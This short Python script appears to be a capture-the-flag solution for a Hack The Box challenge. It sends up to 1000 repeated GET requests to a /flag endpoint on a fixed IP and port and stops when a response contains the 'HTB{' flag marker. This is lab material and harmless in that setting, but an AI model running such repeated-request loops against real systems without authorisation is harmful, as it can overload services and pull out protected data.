import requests

for i in range(1000):
	r = requests.get('http://167.172.50.208:31592/flag', headers={'Accept': 'application/json'})
	print(i)
	print(r.content)
	if 'HTB{' in r.content.decode():
		break